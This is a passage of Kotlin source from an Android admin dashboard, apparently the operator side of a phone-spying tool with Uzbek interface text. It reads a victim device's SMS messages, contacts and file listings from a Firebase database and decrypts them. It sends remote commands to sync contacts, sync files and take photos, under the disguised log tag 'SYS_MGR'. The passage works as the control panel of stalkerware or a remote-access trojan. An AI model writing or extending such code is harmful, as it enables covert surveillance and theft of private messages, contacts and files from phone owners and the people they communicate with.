                        val type = msgSnapshot.child("type").getValue(Int::class.java) ?: 1
                        val id = msgSnapshot.child("id").getValue(String::class.java) ?: ""

                        val body = if (aesKey != null && rawBody.contains(".")) {
                            CryptoManager.decrypt(rawBody, aesKey) ?: rawBody
                        } else rawBody

                        list.add(SmsMessage(
                            messageKey = messageKey,
                            body = body,
                            date = date,
                            type = type,
                            id = id
                        ))
                    } catch (e: Exception) {
                        if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Message parse error: ${e.message}") }
                    }
                }
                
                onLoaded(list.sortedBy { it.date })
            }

            override fun onCancelled(error: DatabaseError) {
                if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Messages listener cancelled: ${error.message}") }
                onLoaded(emptyList())
            }
        })
    }

    /**
     * syncContacts command ni Firebase'ga yozadi
     */
    private fun sendSyncContactsCommand(deviceUid: String) {
        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices")
            .child(deviceUid)
            .child("commands")

        commandsRef.child("syncContacts").setValue(mapOf(
            "type" to "syncContacts",
            "timestamp" to ServerValue.TIMESTAMP,
            "status" to "pending"
        ))
        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncContacts command sent for device: $deviceUid") }
    }

    /**
     * Kontaktlar ro'yxatini ko'rsatuvchi panel
     */
    @Composable
    private fun ContactsPanel(deviceId: String, onDismiss: () -> Unit) {
        var contactsList by remember { mutableStateOf<List<ContactItem>>(emptyList()) }
        var isLoading by remember { mutableStateOf(true) }
        var searchQuery by remember { mutableStateOf("") }

        LaunchedEffect(deviceId) {
            val contactsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
                .getReference("devices")
                .child(deviceId)
                .child("contacts")

            contactsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
                    val list = mutableListOf<ContactItem>()
                    snapshot.children.forEach { child ->
                        try {
                            val id = child.child("id").getValue(String::class.java) ?: ""
                            val rawName = child.child("name").getValue(String::class.java) ?: ""
                            val rawPhone = child.child("phone").getValue(String::class.java) ?: ""
                            val rawEmail = child.child("email").getValue(String::class.java)

                            val name = if (aesKey != null) {
                                CryptoManager.decrypt(rawName, aesKey) ?: rawName
                            } else rawName

                            val phone = if (aesKey != null) {
                                CryptoManager.decrypt(rawPhone, aesKey) ?: rawPhone
                            } else rawPhone

                            val email = if (aesKey != null && rawEmail != null) {
                                CryptoManager.decrypt(rawEmail, aesKey) ?: rawEmail
                            } else rawEmail

                            list.add(ContactItem(id = id, name = name, phone = phone, email = email))
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Contact parse error: ${e.message}") }
                        }
                    }
                    contactsList = list.sortedBy { it.name }
                    isLoading = false
                }

                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Contacts listener cancelled: ${error.message}") }
                    isLoading = false
                }
            })
        }

        val filtered = if (searchQuery.isBlank()) contactsList
        else contactsList.filter {
            it.name.contains(searchQuery, ignoreCase = true) ||
            it.phone.contains(searchQuery)
        }

        Card(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "👤 Kontaktlar (${contactsList.size})",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    TextButton(onClick = onDismiss) { Text("Close") }
                }

                Spacer(modifier = Modifier.height(8.dp))

                // Qidiruv
                OutlinedTextField(
                    value = searchQuery,
                    onValueChange = { searchQuery = it },
                    placeholder = { Text("Qidirish...", fontSize = 13.sp) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )

                Spacer(modifier = Modifier.height(8.dp))

                if (isLoading) {
                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
                        CircularProgressIndicator()
                    }
                } else if (contactsList.isEmpty()) {
                    Text(
                        text = "Kontaktlar topilmadi. Sync tugmasini bosing.",
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        modifier = Modifier.padding(8.dp)
                    )
                } else {
                    LazyColumn {
                        items(filtered) { contact ->
                            ContactItemRow(contact)
                        }
                    }
                }
            }
        }
    }

    @Composable
    private fun ContactItemRow(contact: ContactItem) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 3.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surfaceVariant
            )
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(10.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                // Avatar circle
                Box(
                    modifier = Modifier
                        .size(36.dp)
                        .background(
                            MaterialTheme.colorScheme.primary,
                            shape = RoundedCornerShape(18.dp)
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = contact.name.firstOrNull()?.uppercase() ?: "?",
                        color = MaterialTheme.colorScheme.onPrimary,
                        fontWeight = FontWeight.Bold,
                        fontSize = 14.sp
                    )
                }

                Spacer(modifier = Modifier.width(10.dp))

                Column {
                    Text(
                        text = contact.name,
                        fontWeight = FontWeight.Medium,
                        fontSize = 13.sp
                    )
                    Text(
                        text = contact.phone,
                        fontSize = 12.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    contact.email?.let {
                        Text(
                            text = it,
                            fontSize = 11.sp,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }
        }
    }

    /**
     * syncFiles command ni Firebase'ga yozadi
     */
    private fun sendSyncFilesCommand(deviceUid: String) {
        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices")
            .child(deviceUid)
            .child("commands")

        commandsRef.child("syncFiles").setValue(mapOf(
            "type" to "syncFiles",
            "timestamp" to ServerValue.TIMESTAMP,
            "status" to "pending"
        ))
        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncFiles command sent for device: $deviceUid") }
    }

    /**
     * Fayllar ro'yxatini ko'rsatuvchi panel
     */
    @Composable
    private fun FilesPanel(deviceId: String, onDismiss: () -> Unit) {
        var filesList by remember { mutableStateOf<List<FileItem>>(emptyList()) }
        var isLoading by remember { mutableStateOf(true) }
        var searchQuery by remember { mutableStateOf("") }

        LaunchedEffect(deviceId) {
            val filesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
                .getReference("devices")
                .child(deviceId)
                .child("files")

            filesRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
                    val list = mutableListOf<FileItem>()
                    snapshot.children.forEach { child ->
                        try {
                            val id = child.child("id").getValue(String::class.java) ?: ""
                            val rawName = child.child("name").getValue(String::class.java) ?: ""
                            val rawPath = child.child("path").getValue(String::class.java) ?: ""
                            val size = child.child("size").getValue(Long::class.java) ?: 0L
                            val mimeType = child.child("mimeType").getValue(String::class.java) ?: ""
                            val dateModified = child.child("dateModified").getValue(Long::class.java) ?: 0L

                            val name = if (aesKey != null) {
                                CryptoManager.decrypt(rawName, aesKey) ?: rawName
                            } else rawName

                            val path = if (aesKey != null) {
                                CryptoManager.decrypt(rawPath, aesKey) ?: rawPath
                            } else rawPath

                            list.add(FileItem(
                                id = id,
                                name = name,
                                path = path,
                                size = size,
                                mimeType = mimeType,
                                dateModified = dateModified
                            ))
                        } catch (e: Exception) {
                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "File parse error: ${e.message}") }
                        }
                    }
                    filesList = list.sortedByDescending { it.dateModified }
                    isLoading = false
                }

                override fun onCancelled(error: DatabaseError) {
                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Files listener cancelled: ${error.message}") }
                    isLoading = false
                }
            })
        }

        val filtered = if (searchQuery.isBlank()) filesList
        else filesList.filter {
            it.name.contains(searchQuery, ignoreCase = true) ||
            it.mimeType.contains(searchQuery, ignoreCase = true)
        }

        Card(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "📁 Fayllar (${filesList.size})",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    TextButton(onClick = onDismiss) { Text("Close") }
                }

                Spacer(modifier = Modifier.height(8.dp))

                OutlinedTextField(
                    value = searchQuery,
                    onValueChange = { searchQuery = it },
                    placeholder = { Text("Qidirish...", fontSize = 13.sp) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true
                )

                Spacer(modifier = Modifier.height(8.dp))

                if (isLoading) {
                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
                        CircularProgressIndicator()
                    }
                } else if (filesList.isEmpty()) {
                    Text(
                        text = "Fayllar topilmadi. Sync tugmasini bosing.",
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        modifier = Modifier.padding(8.dp)
                    )
                } else {
                    LazyColumn {
                        items(filtered) { file ->
                            FileItemRow(file)
                        }
                    }
                }
            }
        }
    }

    @Composable
    private fun FileItemRow(file: FileItem) {
        val dateStr = remember(file.dateModified) {
            if (file.dateModified > 0) {
                SimpleDateFormat("dd.MM.yy HH:mm", Locale.getDefault()).format(Date(file.dateModified))
            } else ""
        }
        val sizeStr = remember(file.size) {
            when {
                file.size < 1024 -> "${file.size} B"
                file.size < 1024 * 1024 -> "${file.size / 1024} KB"
                else -> "${file.size / (1024 * 1024)} MB"
            }
        }
        val fileIcon = when {
            file.mimeType.startsWith("image/") -> "🖼️"
            file.mimeType.startsWith("video/") -> "🎬"
            file.mimeType.startsWith("audio/") -> "🎵"
            file.mimeType.contains("pdf") -> "📄"
            file.mimeType.contains("zip") || file.mimeType.contains("rar") -> "🗜️"
            else -> "📄"
        }

        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 3.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surfaceVariant
            )
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(10.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(text = fileIcon, fontSize = 24.sp)

                Spacer(modifier = Modifier.width(10.dp))

                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = file.name,
                        fontWeight = FontWeight.Medium,
                        fontSize = 13.sp,
                        maxLines = 1
                    )
                    Text(
                        text = file.mimeType.ifBlank { "unknown" },
                        fontSize = 11.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }

                Column(horizontalAlignment = Alignment.End) {
                    Text(
                        text = sizeStr,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Medium,
                        color = MaterialTheme.colorScheme.primary
                    )
                    Text(
                        text = dateStr,
                        fontSize = 10.sp,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }
            }
        }
    }

    /**
     * takePhoto command ni Firebase'ga yozadi
     */
    private fun sendTakePhotoCommand(deviceId: String) {
        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
            .getReference("devices")
            .child(deviceId)
            .child("commands")

        commandsRef.child("takePhoto").setValue(mapOf(
            "type" to "takePhoto",
            "timestamp" to ServerValue.TIMESTAMP,
            "status" to "pending"
        ))
        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "takePhoto command sent for device: $deviceId") }
    }

    override fun onResume() {
        super.onResume()
    }
    
    override fun onPause() {
        super.onPause()
    }
    
    override fun onDestroy() {
        super.onDestroy()
    }
    
    override fun onLowMemory() {
        super.onLowMemory()
    }
}

@Composable
fun SmsTabPlaceholder() {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Text("SMS — yuklanmoqda",
            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
    }
}

@Composable
fun ContactsTabPlaceholder() {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Text("Kontakt — yuklanmoqda",
            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
    }
}

@Composable
fun FilesTabPlaceholder() {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Text("Fayllar — yuklanmoqda",
            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
    }
}

@Composable
fun MediaTabPlaceholder() {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Text("Media — yuklanmoqda",
            color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f))
    }
}
